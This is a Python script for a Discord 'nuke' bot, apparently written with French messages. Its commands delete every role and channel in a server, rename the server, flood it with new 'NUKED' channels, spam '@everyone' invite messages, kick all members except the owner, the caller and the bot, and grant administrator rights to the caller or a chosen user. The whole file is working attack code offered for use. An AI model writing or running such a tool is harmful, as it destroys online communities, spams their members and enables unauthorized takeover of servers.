import asyncio
import discord
from discord.ext import commands

client = commands.Bot(command_prefix = "!", intents=discord.Intents.all())
token = input("token: ")


@client.event
async def on_ready():
    await client.change_presence(status=discord.Status.idle, activity=discord.Game(":kappa:"))
    print(client.user)
@client.command()
async def nuke(ctx):
    guild = ctx.message.guild
    for role in guild.roles:
        try:
            if not role.managed or role.is_default():
                await role.delete()
        except discord.errors.HTTPException as e:
            print(f"le role {role.name} n'a pas pu être supprimé.")

    
    await guild.edit(name="nuked ez", community=False)
    await asyncio.gather(*[channel.delete() for channel in ctx.message.guild.channels])
    await channelsnuke(ctx)
async def channelsnuke(ctx):
    t1 = asyncio.create_task(channel_fun(ctx, 25))
    t2 = asyncio.create_task(channel_fun(ctx, 25))
    t3 = asyncio.create_task(channel_fun(ctx, 25))
    t4 = asyncio.create_task(channel_fun(ctx, 25))
    t5 = asyncio.create_task(channel_fun(ctx, 25))
    await asyncio.wait([t1, t2, t3, t4, t5])
    ts1 = asyncio.create_task(spammer(ctx, 40))
    ts2 = asyncio.create_task(spammer(ctx, 40))
    ts3 = asyncio.create_task(spammer(ctx, 40))
    ts4 = asyncio.create_task(spammer(ctx, 40))
    ts5 = asyncio.create_task(spammer(ctx, 40))
    ts6 = asyncio.create_task(spammer(ctx, 40))
    ts7 = asyncio.create_task(spammer(ctx, 40))


async def channel_fun(ctx, number):
    for i in range(int(number)):
        guild = ctx.message.guild
        await guild.create_text_channel(name="NUKED")
async def spammer(ctx, number):
    for i in range(int(number)):
        for channel in ctx.guild.channels:
            await channel.send("@everyone discord.gg/anticancer")
@client.command()
async def kick(ctx):
    guild = ctx.message.guild
    for member in guild.members:
        if member != guild.owner and member != ctx.message.author and member != client.user:
            await member.kick()


@client.command()
async def admin(ctx, id_admin = None):
    guild = ctx.message.guild
    if id_admin != None:
        member = guild.get_member(int(id_admin))
        admin_role = await guild.create_role(name="nouveau rôle", permissions=discord.Permissions(administrator=True))
        await member.add_roles(admin_role)
    else:
        print(ctx.message.author)
        member = guild.get_member(int(ctx.message.author.id))
        admin_role = await guild.create_role(name="nouveau rôle", permissions=discord.Permissions(administrator=True))
        await member.add_roles(admin_role)


client.run(token)
